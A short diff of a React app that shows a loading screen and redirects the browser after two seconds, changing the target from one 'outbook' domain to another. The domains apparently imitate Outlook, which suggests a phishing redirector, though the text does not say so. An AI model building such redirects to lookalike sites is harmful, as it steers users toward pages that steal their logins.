@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook-sharelink.click';
+            window.location.href = 'https://outbook.sabro.ro';
         }, 2000);
 
         return () => clearTimeout(timer);
